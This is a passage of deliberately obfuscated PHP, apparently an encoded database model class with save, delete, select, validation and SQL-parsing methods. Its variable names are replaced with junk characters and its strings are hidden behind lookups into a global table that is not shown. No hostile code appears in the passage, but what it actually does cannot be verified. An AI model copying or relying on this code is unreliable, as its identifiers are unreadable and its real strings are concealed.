$Í§¸ ¹¨) { $•ïÒÜ‘Î[$°ã·ôº] = $this->_facade($Í§¸ ¹¨); } if (method_exists($this->db, $”â”ÒîØ[316])) { $†Æ’çú¨ = $this->db->insertAll($•ïÒÜ‘Î, $Ÿ¢è–—, $”ÙúË½š); } else { $this->startTrans(); foreach ($•ïÒÜ‘Î as $°ã·ôº => $Í§¸ ¹¨) { $†Æ’çú¨ = $this->db->insert($Í§¸ ¹¨, $Ÿ¢è–—, $”ÙúË½š); } $this->commit(); } if (!1 !== $†Æ’çú¨) { $éÁ¼­„ = $this->getLastInsID(); if ($éÁ¼­„) { return $éÁ¼­„; } } return $†Æ’çú¨; } public function selectAdd($›øÙíœ· = '', $ÁûªÊĞì = '', $åŒµ¼µØ = array()) { $ıÜ¬Ú® =& $_SERVER[³½¬ÚË¯]; $åŒµ¼µØ = $this->_parseOptions($åŒµ¼µØ); if (!1 === ($×”»úö© = $this->db->selectInsert($›øÙíœ· ? $›øÙíœ· : $åŒµ¼µØ[$ıÜ¬Ú®[317]], $ÁûªÊĞì ? $ÁûªÊĞì : $this->getTableName(), $åŒµ¼µØ))) { $this->error = think_lang($ıÜ¬Ú®[318]); return !1; } else { return $×”»úö©; } } public function save($Óîí„™Ä = '', $ŞÃËãÕ = array()) { $ğä¬ã¤é =& $_SERVER[³½¬ÚË¯]; if (empty($Óîí„™Ä)) { if (!empty($this->data)) { $Óîí„™Ä = $this->data; $this->data = array(); } else { $this->error = think_lang($ğä¬ã¤é[315]); return !1; } } $Óîí„™Ä = $this->_facade($Óîí„™Ä); $ŞÃËãÕ = $this->_parseOptions($ŞÃËãÕ); $´İ¨Äîà = $this->getPk(); if (!isset($ŞÃËãÕ[$ğä¬ã¤é[319]])) { if (isset($Óîí„™Ä[$´İ¨Äîà])) { $£©îÊŠğ[$´İ¨Äîà] = $Óîí„™Ä[$´İ¨Äîà]; $ŞÃËãÕ[$ğä¬ã¤é[319]] = $£©îÊŠğ; unset($Óîí„™Ä[$´İ¨Äîà]); } else { $this->error = think_lang($ğä¬ã¤é[318]); return !1; } } if (is_array($ŞÃËãÕ[$ğä¬ã¤é[319]]) && isset($ŞÃËãÕ[$ğä¬ã¤é[319]][$´İ¨Äîà])) { $Ôƒö˜Ì¼ = $ŞÃËãÕ[$ğä¬ã¤é[319]][$´İ¨Äîà]; } if (!1 === $this->_beforeUpdate($Óîí„™Ä, $ŞÃËãÕ)) { return !1; } $Ù‘éØ´¦ = $this->db->update($Óîí„™Ä, $ŞÃËãÕ); if (!1 !== $Ù‘éØ´¦) { if (isset($Ôƒö˜Ì¼)) { $Óîí„™Ä[$´İ¨Äîà] = $Ôƒö˜Ì¼; } $this->_afterUpdate($Óîí„™Ä, $ŞÃËãÕ); } return $Ù‘éØ´¦; } protected function _beforeUpdate(&$°¦óÑ¡Ã, $õÕª¼·) { } protected function _afterUpdate($šÇÃ¿ˆ², $­·¾•Ê×) { } public function delete($Áâ¿Æ‹ = array()) { $ÜÂ—Ê†ù =& $_SERVER[³½¬ÚË¯]; if (empty($Áâ¿Æ‹) && empty($this->options[$ÜÂ—Ê†ù[319]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $úñ¥ù¼œ = $this->getPk(); if (is_numeric($Áâ¿Æ‹) || is_string($Áâ¿Æ‹)) { if (strpos($Áâ¿Æ‹, $ÜÂ—Ê†ù[50])) { $ı¯í’×¡[$úñ¥ù¼œ] = array($ÜÂ—Ê†ù[320], $Áâ¿Æ‹); } else { $ı¯í’×¡[$úñ¥ù¼œ] = $Áâ¿Æ‹; } $this->options[$ÜÂ—Ê†ù[319]] = $ı¯í’×¡; } $Áâ¿Æ‹ = $this->_parseOptions(); if (is_array($Áâ¿Æ‹[$ÜÂ—Ê†ù[319]]) && isset($Áâ¿Æ‹[$ÜÂ—Ê†ù[319]][$úñ¥ù¼œ])) { $ŞÍ«‹ªİ = $Áâ¿Æ‹[$ÜÂ—Ê†ù[319]][$úñ¥ù¼œ]; } $ß„û¢’™ = $this->db->delete($Áâ¿Æ‹); if (!1 !== $ß„û¢’™) { $šÂ¤Å = array(); if (isset($ŞÍ«‹ªİ)) { $šÂ¤Å[$úñ¥ù¼œ] = $ŞÍ«‹ªİ; } $this->_after_delete($šÂ¤Å, $Áâ¿Æ‹); } return $ß„û¢’™; } protected function _after_delete($Î²¹ƒÓå, $Ç‘ş‚¸—) { } public function select($˜®™€¯¹ = array()) { $è½‡‹Ñ¥ =& $_SERVER[³½¬ÚË¯]; if (is_string($˜®™€¯¹) || is_numeric($˜®™€¯¹)) { $óÛıŞĞ½ = $this->getPk(); if (strpos($˜®™€¯¹, $è½‡‹Ñ¥[50])) { $Óö©î¹¤[$óÛıŞĞ½] = array($è½‡‹Ñ¥[320], $˜®™€¯¹); } else { $Óö©î¹¤[$óÛıŞĞ½] = $˜®™€¯¹; } $this->options[$è½‡‹Ñ¥[319]] = $Óö©î¹¤; } elseif (!1 === $˜®™€¯¹) { $˜®™€¯¹ = $this->_parseOptions(); return $è½‡‹Ñ¥[321] . $this->db->buildSelectSql($˜®™€¯¹) . $è½‡‹Ñ¥[322]; } $˜®™€¯¹ = $this->_parseOptions(); $áõÙô¶± = $this->db->select($˜®™€¯¹); if (!1 === $áõÙô¶±) { return !1; } if (empty($áõÙô¶±)) { return null; } $this->_afterSelect($áõÙô¶±, $˜®™€¯¹); return $áõÙô¶±; } protected function _afterSelect(&$ç­Á¿õı, $ÁŸü‡†¾) { } public function buildSql($´¢ôÚì÷ = array()) { $œÕ‹•™¢ =& $_SERVER[³½¬ÚË¯]; $´¢ôÚì÷ = $this->_parseOptions($´¢ôÚì÷); return $œÕ‹•™¢[321] . $this->db->buildSelectSql($´¢ôÚì÷) . $œÕ‹•™¢[322]; } public function optionsValue($Üã”Ò» = null) { if (is_null($Üã”Ò»)) { return $this->options; } elseif (is_array($Üã”Ò»)) { $this->options = array_merge($this->options, $Üã”Ò»); } } protected function _parseOptions($¼¾¬·İµ = array()) { $•ÊÃàÈƒ =& $_SERVER[³½¬ÚË¯]; if (is_array($¼¾¬·İµ)) { $¼¾¬·İµ = array_merge($this->options, $¼¾¬·İµ); } $this->options = array(); if (!isset($¼¾¬·İµ[$•ÊÃàÈƒ[323]])) { $¼¾¬·İµ[$•ÊÃàÈƒ[323]] = $this->getTableName(); $»ÍŸ¿¡Ô = $this->fields; } else { $»ÍŸ¿¡Ô = $this->getDbFields(); } if (!empty($¼¾¬·İµ[$•ÊÃàÈƒ[324]])) { $¼¾¬·İµ[$•ÊÃàÈƒ[323]] .= $•ÊÃàÈƒ[53] . $¼¾¬·İµ[$•ÊÃàÈƒ[324]]; } $¼¾¬·İµ[$•ÊÃàÈƒ[325]] = $this->name; if (isset($¼¾¬·İµ[$•ÊÃàÈƒ[319]]) && is_array($¼¾¬·İµ[$•ÊÃàÈƒ[319]]) && !empty($»ÍŸ¿¡Ô) && !isset($¼¾¬·İµ[$•ÊÃàÈƒ[326]]) && !isset($¼¾¬·İµ[$•ÊÃàÈƒ[323]])) { foreach ($¼¾¬·İµ[$•ÊÃàÈƒ[319]] as $©åüîƒ­ => $Š˜€«ª¤) { $©åüîƒ­ = trim($©åüîƒ­); if (in_array($©åüîƒ­, $»ÍŸ¿¡Ô, !0)) { if (is_scalar($Š˜€«ª¤)) { $this->_parseType($¼¾¬·İµ[$•ÊÃàÈƒ[319]], $©åüîƒ­); } } elseif (!is_numeric($©åüîƒ­) && $•ÊÃàÈƒ[11] != substr($©åüîƒ­, 0, 1) && !1 === strpos($©åüîƒ­, $•ÊÃàÈƒ[10]) && !1 === strpos($©åüîƒ­, $•ÊÃàÈƒ[304]) && !1 === strpos($©åüîƒ­, $•ÊÃàÈƒ[327]) && !1 === strpos($©åüîƒ­, $•ÊÃàÈƒ[328])) { unset($¼¾¬·İµ[$•ÊÃàÈƒ[319]][$©åüîƒ­]); } } } $this->_options_filter($¼¾¬·İµ); return $¼¾¬·İµ; } protected function _options_filter(&$ÖêÎùƒ) { } protected function _parseType(&$µ«˜ĞÏš, $Ç¹¹ÅÇ«) { $õªñ‹Ñ =& $_SERVER[³½¬ÚË¯]; if (empty($this->options[$õªñ‹Ñ[329]][$õªñ‹Ñ[4] . $Ç¹¹ÅÇ«])) { $Øª«á† = strtolower($this->fields[$õªñ‹Ñ[296]][$Ç¹¹ÅÇ«]); if (!1 !== strpos($Øª«á†, $õªñ‹Ñ[330])) { } elseif (!1 === strpos($Øª«á†, $õªñ‹Ñ[331]) && !1 !== strpos($Øª«á†, $õªñ‹Ñ[332])) { $µ«˜ĞÏš[$Ç¹¹ÅÇ«] = intval($µ«˜ĞÏš[$Ç¹¹ÅÇ«]); } elseif (!1 !== strpos($Øª«á†, $õªñ‹Ñ[333]) || !1 !== strpos($Øª«á†, $õªñ‹Ñ[334])) { $µ«˜ĞÏš[$Ç¹¹ÅÇ«] = floatval($µ«˜ĞÏš[$Ç¹¹ÅÇ«]); } elseif (!1 !== strpos($Øª«á†, $õªñ‹Ñ[335])) { $µ«˜ĞÏš[$Ç¹¹ÅÇ«] = (bool) $µ«˜ĞÏš[$Ç¹¹ÅÇ«]; } } } public function find($Õò„¹§ = array()) { $­Âİµ‘¦ =& $_SERVER[³½¬ÚË¯]; if (is_numeric($Õò„¹§) || is_string($Õò„¹§)) { $ş÷óÄë¶[$this->getPk()] = intval($Õò„¹§); $this->options[$­Âİµ‘¦[319]] = $ş÷óÄë¶; } $this->options[$­Âİµ‘¦[336]] = 1; $Õò„¹§ = $this->_parseOptions(); $ÃÌ¦èÄ = $this->db->select($Õò„¹§); if (!1 === $ÃÌ¦èÄ) { return !1; } if (empty($ÃÌ¦èÄ)) { return null; } $this->data = $ÃÌ¦èÄ[0]; $this->_afterFind($this->data, $Õò„¹§); if (!empty($this->options[$­Âİµ‘¦[337]])) { return $this->returnResult($this->data, $this->options[$­Âİµ‘¦[337]]); } return $this->data; } protected function _afterFind(&$Î¼ÈÛÂû, $¶ƒ¤„—) { } protected function returnResult($ª—ÙÏØü, $×§±Ò² = '') { $ø³Ú¤ë¬ =& $_SERVER[³½¬ÚË¯]; if ($×§±Ò²) { if (is_callable($×§±Ò²)) { return call_user_func($×§±Ò², $ª—ÙÏØü); } switch (strtolower($×§±Ò²)) { case $ø³Ú¤ë¬[338]: return json_encode($ª—ÙÏØü); case $ø³Ú¤ë¬[339]: return xml_encode($ª—ÙÏØü); } } return $ª—ÙÏØü; } public function parseFieldsMap($ğàˆÁ¤·, $°èõ¦×ï = 1) { if (!empty($this->_map)) { foreach ($this->_map as $İöÚ•Òƒ => $ª±›„¿ø) { if ($°èõ¦×ï == 1) { if (isset($ğàˆÁ¤·[$ª±›„¿ø])) { $ğàˆÁ¤·[$İöÚ•Òƒ] = $ğàˆÁ¤·[$ª±›„¿ø]; unset($ğàˆÁ¤·[$ª±›„¿ø]); } } else { if (isset($ğàˆÁ¤·[$İöÚ•Òƒ])) { $ğàˆÁ¤·[$ª±›„¿ø] = $ğàˆÁ¤·[$İöÚ•Òƒ]; unset($ğàˆÁ¤·[$İöÚ•Òƒ]); } } } } return $ğàˆÁ¤·; } public function setField($ŒÒè®Şê, $š¸§å» = '') { if (is_array($ŒÒè®Şê)) { $Ü¯š¸¶Á = $ŒÒè®Şê; } else { $Ü¯š¸¶Á[$ŒÒè®Şê] = $š¸§å»; } return $this->save($Ü¯š¸¶Á); } public function setAdd($‹í¯Öò¥, $·‚¬Î¸‹ = 1) { $ªì®öêÒ =& $_SERVER[³½¬ÚË¯]; $¬²ù”ğæ = $‹í¯Öò¥ . $ªì®öêÒ[340] . $·‚¬Î¸‹; if ($·‚¬Î¸‹ < 0) { $¬²ù”ğæ = $‹í¯Öò¥ . $·‚¬Î¸‹; } return $this->setField($‹í¯Öò¥, array($ªì®öêÒ[341], $¬²ù”ğæ)); } public function getField($Å…û¨˜ä, $ì»Ô„“® = null) { $çìíÀ›² =& $_SERVER[³½¬ÚË¯]; $ è¯×€[$çìíÀ›²[317]] = $Å…û¨˜ä; $ è¯×€ = $this->_parseOptions($ è¯×€); $Å…û¨˜ä = trim($Å…û¨˜ä); if (strpos($Å…û¨˜ä, $çìíÀ›²[50])) { if (!isset($ è¯×€[$çìíÀ›²[336]])) { $ è¯×€[$çìíÀ›²[336]] = is_numeric($ì»Ô„“®) ? $ì»Ô„“® : $çìíÀ›²[12]; } $­ƒ¢»ƒå = $this->db->select($ è¯×€); if (!empty($­ƒ¢»ƒå)) { $…ïÙĞİ¬ = explode($çìíÀ›²[50], $Å…û¨˜ä); $Å…û¨˜ä = array_keys($­ƒ¢»ƒå[0]); $ğßäÏîù = array_shift($Å…û¨˜ä); $©¥äáé¦ = array_shift($Å…û¨˜ä); $ºæÒ…Ê¦ = array(); $¸±¹öÔ¡ = count($…ïÙĞİ¬); foreach ($­ƒ¢»ƒå as $…´©Ï®œ) { $´¥”Âèñ = $…´©Ï®œ[$ğßäÏîù]; if (2 == $¸±¹öÔ¡) { $ºæÒ…Ê¦[$´¥”Âèñ] = $…´©Ï®œ[$©¥äáé¦]; } else { $ºæÒ…Ê¦[$´¥”Âèñ] = is_string($ì»Ô„“®) ? implode($ì»Ô„“®, $…´©Ï®œ) : $…´©Ï®œ; } } return $ºæÒ…Ê¦; } } else { if (!0 !== $ì»Ô„“®) { $ è¯×€[$çìíÀ›²[336]] = is_numeric($ì»Ô„“®) ? $ì»Ô„“® : 1; } if ($ì»Ô„“® === $çìíÀ›²[299]) { unset($ è¯×€[$çìíÀ›²[336]]); } $…´©Ï®œ = $this->db->select($ è¯×€); if (!empty($…´©Ï®œ)) { if ($ì»Ô„“® === $çìíÀ›²[299]) { return reset($…´©Ï®œ[0]); } if (!0 !== $ì»Ô„“® && 1 == $ è¯×€[$çìíÀ›²[336]]) { return reset($…´©Ï®œ[0]); } foreach ($…´©Ï®œ as $³Âş¼ßÉ) { $Üí²û·ü[] = $³Âş¼ßÉ[$Å…û¨˜ä]; } return $Üí²û·ü; } } return null; } public function create($Í¯Çİß¼ = '', $—Ø¬†‚ = '') { $ÇóõÍ³å =& $_SERVER[³½¬ÚË¯]; if (empty($Í¯Çİß¼)) { $Í¯Çİß¼ = $_POST; } elseif (is_object($Í¯Çİß¼)) { $Í¯Çİß¼ = get_object_vars($Í¯Çİß¼); } if (empty($Í¯Çİß¼) || !is_array($Í¯Çİß¼)) { $this->error = think_lang($ÇóõÍ³å[315]); return !1; } $Í¯Çİß¼ = $this->parseFieldsMap($Í¯Çİß¼, 0); $—Ø¬†‚ = $—Ø¬†‚ ? $—Ø¬†‚ : (!empty($Í¯Çİß¼[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÇóõÍ³å[317]])) { $÷åÄğğµ = $this->options[$ÇóõÍ³å[317]]; unset($this->options[$ÇóõÍ³å[317]]); } elseif ($—Ø¬†‚ == THINK_MODEL_INSERT && isset($this->insertFields)) { $÷åÄğğµ = $this->insertFields; } elseif ($—Ø¬†‚ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $÷åÄğğµ = $this->updateFields; } if (isset($÷åÄğğµ)) { if (is_string($÷åÄğğµ)) { $÷åÄğğµ = explode($ÇóõÍ³å[50], $÷åÄğğµ); } if (think_config($ÇóõÍ³å[342])) { $÷åÄğğµ[] = think_config($ÇóõÍ³å[343]); } foreach ($Í¯Çİß¼ as $¨İÁŒŠ¢ => $Ö†Á…) { if (!in_array($¨İÁŒŠ¢, $÷åÄğğµ)) { unset($Í¯Çİß¼[$¨İÁŒŠ¢]); } } } if (!$this->autoValidation($Í¯Çİß¼, $—Ø¬†‚)) { return !1; } if (!$this->autoCheckToken($Í¯Çİß¼)) { $this->error = think_lang($ÇóõÍ³å[344]); return !1; } if ($this->autoCheckFields) { $÷åÄğğµ = $this->getDbFields(); foreach ($Í¯Çİß¼ as $¨İÁŒŠ¢ => $Ö†Á…) { if (!in_array($¨İÁŒŠ¢, $÷åÄğğµ)) { unset($Í¯Çİß¼[$¨İÁŒŠ¢]); } elseif (MAGIC_QUOTES_GPC && is_string($Ö†Á…)) { $Í¯Çİß¼[$¨İÁŒŠ¢] = stripslashes($Ö†Á…); } } } $this->autoOperation($Í¯Çİß¼, $—Ø¬†‚); $this->data = $Í¯Çİß¼; return $Í¯Çİß¼; } public function autoCheckToken($®Ä»«ŸÏ) { $È’ÃŒ“ü =& $_SERVER[³½¬ÚË¯]; if (isset($this->options[$È’ÃŒ“ü[345]]) && !$this->options[$È’ÃŒ“ü[345]]) { return !0; } if (think_config($È’ÃŒ“ü[342])) { $Æ§°ÄÒ = think_config($È’ÃŒ“ü[343]); if (!isset($®Ä»«ŸÏ[$Æ§°ÄÒ]) || Session::get($Æ§°ÄÒ)) { return !1; } list($íÊ¯ÛêÆ, $îû›ƒ„’) = explode($È’ÃŒ“ü[11], $®Ä»«ŸÏ[$Æ§°ÄÒ]); if ($îû›ƒ„’ && Session::get($Æ§°ÄÒ . $È’ÃŒ“ü[10] . $íÊ¯ÛêÆ) === $îû›ƒ„’) { Session::remove($Æ§°ÄÒ . $È’ÃŒ“ü[10] . $íÊ¯ÛêÆ); return !0; } if (think_config($È’ÃŒ“ü[346])) { Session::remove($Æ§°ÄÒ . $È’ÃŒ“ü[10] . $íÊ¯ÛêÆ); } return !1; } return !0; } public function regex($¾µÊñèÇ, $‚óş«) { $²òüÜÜ¨ =& $_SERVER[³½¬ÚË¯]; $ÌĞ­ûæŒ = array($²òüÜÜ¨[347] => $²òüÜÜ¨[348], $²òüÜÜ¨[349] => $²òüÜÜ¨[350], $²òüÜÜ¨[351] => $²òüÜÜ¨[352], $²òüÜÜ¨[353] => $²òüÜÜ¨[354], $²òüÜÜ¨[355] => $²òüÜÜ¨[356], $²òüÜÜ¨[357] => $²òüÜÜ¨[358], $²òüÜÜ¨[359] => $²òüÜÜ¨[360], $²òüÜÜ¨[334] => $²òüÜÜ¨[361], $²òüÜÜ¨[362] => $²òüÜÜ¨[363]); if (isset($ÌĞ­ûæŒ[strtolower($‚óş«)])) { $‚óş« = $ÌĞ­ûæŒ[strtolower($‚óş«)]; } return preg_match($‚óş«, $¾µÊñèÇ) === 1; } private function autoOperation(&$—Ò†ÎÙÃ, $šŠÎË¼ù) { $‘ ä²¥ó =& $_SERVER[³½¬ÚË¯]; if (!empty($this->options[$‘ ä²¥ó[364]])) { $‹¡­¿÷ò = $this->options[$‘ ä²¥ó[364]]; unset($this->options[$‘ ä²¥ó[364]]); } elseif (!empty($this->_auto)) { $‹¡­¿÷ò = $this->_auto; } if (isset($‹¡­¿÷ò)) { foreach ($‹¡­¿÷ò as $å˜è¦Í•) { if (empty($å˜è¦Í•[2])) { $å˜è¦Í•[2] = THINK_MODEL_INSERT; } if ($šŠÎË¼ù == $å˜è¦Í•[2] || $å˜è¦Í•[2] == THINK_MODEL_BOTH) { switch (trim($å˜è¦Í•[3])) { case $‘ ä²¥ó[365]: case $‘ ä²¥ó[366]: $ú¥¯ëÕì = isset($å˜è¦Í•[4]) ? (array) $å˜è¦Í•[4] : array(); if (isset($—Ò†ÎÙÃ[$å˜è¦Í•[0]])) { array_unshift($ú¥¯ëÕì, $—Ò†ÎÙÃ[$å˜è¦Í•[0]]); } if ($‘ ä²¥ó[365] == $å˜è¦Í•[3]) { $—Ò†ÎÙÃ[$å˜è¦Í•[0]] = call_user_func_array($å˜è¦Í•[1], $ú¥¯ëÕì); } else { $—Ò†ÎÙÃ[$å˜è¦Í•[0]] = call_user_func_array(array(&$this, $å˜è¦Í•[1]), $ú¥¯ëÕì); } break; case $‘ ä²¥ó[317]: $—Ò†ÎÙÃ[$å˜è¦Í•[0]] = $—Ò†ÎÙÃ[$å˜è¦Í•[1]]; break; case $‘ ä²¥ó[367]: if ($‘ ä²¥ó[12] === $—Ò†ÎÙÃ[$å˜è¦Í•[0]]) { unset($—Ò†ÎÙÃ[$å˜è¦Í•[0]]); } break; case $‘ ä²¥ó[368]: default: $—Ò†ÎÙÃ[$å˜è¦Í•[0]] = $å˜è¦Í•[1]; } if (!1 === $—Ò†ÎÙÃ[$å˜è¦Í•[0]]) { unset($—Ò†ÎÙÃ[$å˜è¦Í•[0]]); } } } } return $—Ò†ÎÙÃ; } protected function autoValidation($ØÉ»ä¦Ö, $Ÿ»ê¡­Û) { $°ñ®»ïæ =& $_SERVER[³½¬ÚË¯]; if (!empty($this->options[$°ñ®»ïæ[369]])) { $„Å—ç = $this->options[$°ñ®»ïæ[369]]; unset($this->options[$°ñ®»ïæ[369]]); } elseif (!empty($this->_validate)) { $„Å—ç = $this->_validate; } if (isset($„Å—ç)) { if ($this->patchValidate) { $this->error = array(); } foreach ($„Å—ç as $òõ¸ÖÈ– => $‰ıİö·Â) { if (empty($‰ıİö·Â[5]) || $‰ıİö·Â[5] == THINK_MODEL_BOTH || $‰ıİö·Â[5] == $Ÿ»ê¡­Û) { if (0 == strpos($‰ıİö·Â[2], $°ñ®»ïæ[370]) && strpos($‰ıİö·Â[2], $°ñ®»ïæ[371])) { $‰ıİö·Â[2] = think_lang(substr($‰ıİö·Â[2], 2, -1)); } $‰ıİö·Â[3] = isset($‰ıİö·Â[3]) ? $‰ıİö·Â[3] : THINK_EXISTS_VALIDATE; $‰ıİö·Â[4] = isset($‰ıİö·Â[4]) ? $‰ıİö·Â[4] : $°ñ®»ïæ[372]; switch ($‰ıİö·Â[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ØÉ»ä¦Ö, $‰ıİö·Â)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($°ñ®»ïæ[12] != trim($ØÉ»ä¦Ö[$‰ıİö·Â[0]])) { if (!1 === $this->_validationField($ØÉ»ä¦Ö, $‰ıİö·Â)) { return !1; } } break; default: if (isset($ØÉ»ä¦Ö[$‰ıİö·Â[0]])) { if (!1 === $this->_validationField($ØÉ»ä¦Ö, $‰ıİö·Â)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¦ı™íöŒ, $•Ğª×–¥) { if (!1 === $this->_validationFieldItem($¦ı™íöŒ, $•Ğª×–¥)) { if ($this->patchValidate) { $this->error[$•Ğª×–¥[0]] = $•Ğª×–¥[2]; } else { $this->error = $•Ğª×–¥[2]; return !1; } } return; } protected function _validationFieldItem($ˆ‰Ò‰üà, $Š›†»µ¬) { $‘Ùó‘í¨ =& $_SERVER[³½¬ÚË¯]; switch (strtolower(trim($Š›†»µ¬[4]))) { case $‘Ùó‘í¨[365]: case $‘Ùó‘í¨[366]: $ª”íƒ² = isset($Š›†»µ¬[6]) ? (array) $Š›†»µ¬[6] : array(); if (is_string($Š›†»µ¬[0]) && strpos($Š›†»µ¬[0], $‘Ùó‘í¨[50])) { $Š›†»µ¬[0] = explode($‘Ùó‘í¨[50], $Š›†»µ¬[0]); } if (is_array($Š›†»µ¬[0])) { foreach ($Š›†»µ¬[0] as $ììÛõœ) { $…È¿ú˜[$ììÛõœ] = $ˆ‰Ò‰üà[$ììÛõœ]; } array_unshift($ª”íƒ², $…È¿ú˜); } else { array_unshift($ª”íƒ², $ˆ‰Ò‰üà[$Š›†»µ¬[0]]); } if ($‘Ùó‘í¨[365] == $Š›†»µ¬[4]) { return call_user_func_array($Š›†»µ¬[1], $ª”íƒ²); } else { return call_user_func_array(array(&$this, $Š›†»µ¬[1]), $ª”íƒ²); } case $‘Ùó‘í¨[373]: return $ˆ‰Ò‰üà[$Š›†»µ¬[0]] == $ˆ‰Ò‰üà[$Š›†»µ¬[1]]; case $‘Ùó‘í¨[374]: if (is_string($Š›†»µ¬[0]) && strpos($Š›†»µ¬[0], $‘Ùó‘í¨[50])) { $Š›†»µ¬[0] = explode($‘Ùó‘í¨[50], $Š›†»µ¬[0]); } $øÀßü¹˜ = array(); if (is_array($Š›†»µ¬[0])) { foreach ($Š›†»µ¬[0] as $ììÛõœ) { $øÀßü¹˜[$ììÛõœ] = $ˆ‰Ò‰üà[$ììÛõœ]; } } else { $øÀßü¹˜[$Š›†»µ¬[0]] = $ˆ‰Ò‰üà[$Š›†»µ¬[0]]; } if (!empty($ˆ‰Ò‰üà[$this->getPk()])) { $øÀßü¹˜[$this->getPk()] = array($‘Ùó‘í¨[375], $ˆ‰Ò‰üà[$this->getPk()]); } if ($this->where($øÀßü¹˜)->find()) { return !1; } return !0; default: return $this->check($ˆ‰Ò‰üà[$Š›†»µ¬[0]], $Š›†»µ¬[1], $Š›†»µ¬[4]); } } public function check($—Îªü‰, $›ĞØ¨€­, $¢Áëõœ = "\x72\x65\147\x65\x78") { $à‘ßåª =& $_SERVER[³½¬ÚË¯]; $¢Áëõœ = strtolower(trim($¢Áëõœ)); switch ($¢Áëõœ) { case $à‘ßåª[7]: case $à‘ßåª[376]: $»æœÒ­ = is_array($›ĞØ¨€­) ? $›ĞØ¨€­ : explode($à‘ßåª[50], $›ĞØ¨€­); return $¢Áëõœ == $à‘ßåª[7] ? in_array($—Îªü‰, $»æœÒ­) : !in_array($—Îªü‰, $»æœÒ­); case $à‘ßåª[377]: case $à‘ßåª[378]: if (is_array($›ĞØ¨€­)) { $é¤İ‡Äñ = $›ĞØ¨€­[0]; $¡¡Ä…û° = $›ĞØ¨€­[1]; } else { list($é¤İ‡Äñ, $¡¡Ä…û°) = explode($à‘ßåª[50], $›ĞØ¨€­); } return $¢Áëõœ == $à‘ßåª[377] ? $—Îªü‰ >= $é¤İ‡Äñ && $—Îªü‰ <= $¡¡Ä…û° : $—Îªü‰ < $é¤İ‡Äñ || $—Îªü‰ > $¡¡Ä…û°; case $à‘ßåª[379]: case $à‘ßåª[380]: return $¢Áëõœ == $à‘ßåª[379] ? $—Îªü‰ == $›ĞØ¨€­ : $—Îªü‰ != $›ĞØ¨€­; case $à‘ßåª[381]: $ÀŒ¿´Ë = mb_strlen($—Îªü‰, $à‘ßåª[382]); if (strpos($›ĞØ¨€­, $à‘ßåª[50])) { list($é¤İ‡Äñ, $¡¡Ä…û°) = explode($à‘ßåª[50], $›ĞØ¨€­); return $ÀŒ¿´Ë >= $é¤İ‡Äñ && $ÀŒ¿´Ë <= $¡¡Ä…û°; } else { return $ÀŒ¿´Ë == $›ĞØ¨€­; } case $à‘ßåª[383]: list($ò®Ï™§å, $½‡ú´°) = explode($à‘ßåª[50], $›ĞØ¨€­); if (!is_numeric($ò®Ï™§å)) { $ò®Ï™§å = strtotime($ò®Ï™§å); } if (!is_numeric($½‡ú´°)) { $½‡ú´° = strtotime($½‡ú´°); } return NOW_TIME >= $ò®Ï™§å && NOW_TIME <= $½‡ú´°; case $à‘ßåª[384]: return in_array(get_client_ip(), explode($à‘ßåª[50], $›ĞØ¨€­)); case $à‘ßåª[385]: return !in_array(get_client_ip(), explode($à‘ßåª[50], $›ĞØ¨€­)); case $à‘ßåª[372]: default: return $this->regex($—Îªü‰, $›ĞØ¨€­); } } public function query($·˜·Òñ, $äåİÃáå = false) { $Ú¯›Šä =& $_SERVER[³½¬ÚË¯]; if (!is_bool($äåİÃáå) && !is_array($äåİÃáå)) { $äåİÃáå = func_get_args(); array_shift($äåİÃáå); } $·˜·Òñ = str_replace(array($Ú¯›Šä[246], $Ú¯›Šä[386]), $Ú¯›Šä[53], $·˜·Òñ); $·˜·Òñ = $this->parseSql($·˜·Òñ, $äåİÃáå); return $this->db->query($·˜·Òñ); } public function execute($œÖ¬è», $„ğ¼÷•ğ = false) { if (!is_bool($„ğ¼÷•ğ) && !is_array($„ğ¼÷•ğ)) { $„ğ¼÷•ğ = func_get_args(); array_shift($„ğ¼÷•ğ); } $œÖ¬è» = $this->parseSql($œÖ¬è», $„ğ¼÷•ğ); return $this->db->execute($œÖ¬è»); } protected function parseSql($”É¿ñš, $õò¾ïìª) { $„¢¸‘ =& $_SERVER[³½¬ÚË¯]; if (!0 === $õò¾ïìª) { $íîÈ¶‡ = $this->_parseOptions(); $”É¿ñš = $this->db->parseSql($”É¿ñš, $íîÈ¶‡); } elseif (is_array($õò¾ïìª)) { $õò¾ïìª = array_map(array($this->db, $„¢¸‘[387]), $õò¾ïìª); $”É¿ñš = vsprintf($”É¿ñš, $õò¾ïìª); } else { $”É¿ñš = strtr($”É¿ñš, array($„¢¸‘[388] => $this->getTableName(), $„¢¸‘[389] => think_config($„¢¸‘[288]))); } $this->db->setModel($this->name); return $”É¿ñš; } public function db($Ğ‹…¤¡î = '', $Î½Æ®ß­ = '', $¢ü¾ÑÃ„ = array()) { $ÌäÇ³‰× =& $_SERVER[³½¬ÚË¯]; if ($ÌäÇ³‰×[12] === $Ğ‹…¤¡î && $this->db) { return $this->db; } static $ñÏ¬•­ = array(); static $Ş†İ‚Ï… = array(); if (!isset($Ş†İ‚Ï…[$Ğ‹…¤¡î]) || isset($Ş†İ‚Ï…[$Ğ‹…¤¡î]) && $Î½Æ®ß­ && $ñÏ¬•­[$Ğ‹…¤¡î] != $Î½Æ®ß­) { if (!empty($Î½Æ®ß­) && is_string($Î½Æ®ß­) && !1 === strpos($Î½Æ®ß­, $ÌäÇ³‰×[8])) { $Î½Æ®ß­ = think_config($Î½Æ®ß­); } $Ğ‹…¤¡î = think_guid($Î½Æ®ß­); $Ş†İ‚Ï…[$Ğ‹…¤¡î] = Db::getInstance($Î½Æ®ß­); } elseif (NULL === $Î½Æ®ß­) { $Ş†İ‚Ï…[$Ğ‹…¤¡î]->close(); unset($Ş†İ‚Ï…[$Ğ‹…¤¡î]); return; } if (!empty($¢ü¾ÑÃ„)) { if (is_string($¢ü¾ÑÃ„)) { parse_str($¢ü¾ÑÃ„, $¢ü¾ÑÃ„); } foreach ($¢ü¾ÑÃ„ as $ÇÛ¥ë€Ò => $Ñê“ô„ı) { 